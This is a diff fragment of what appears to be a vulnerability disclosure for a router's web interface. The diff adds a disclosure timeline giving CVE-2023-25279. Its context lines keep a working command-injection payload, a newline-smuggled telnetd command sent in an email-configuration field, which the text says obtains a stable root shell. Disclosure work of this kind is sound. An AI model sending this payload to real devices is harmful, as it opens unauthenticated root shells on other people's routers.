@@ -66,3 +66,11 @@ ccp_act=set&ccpSubEvent=CCP_SUB_WEBPAGE_APPLY&nextPage=tools_email.asp&emailCfg_
 ```
 
 Finally, you can write exp, which can achieve a very stable effect of obtaining the root shell，Such as`emailCfg_AccountName_1.1.0.0=%0atelnetd -l /bin/sh -p 10000 -b 0.0.0.0%0a`
+
+
+
+## Disclosure
+
+- Feb 7, 2023:Public disclosure
+
+- Mar 7, 2023:Assign CVE number CVE-2023-25279
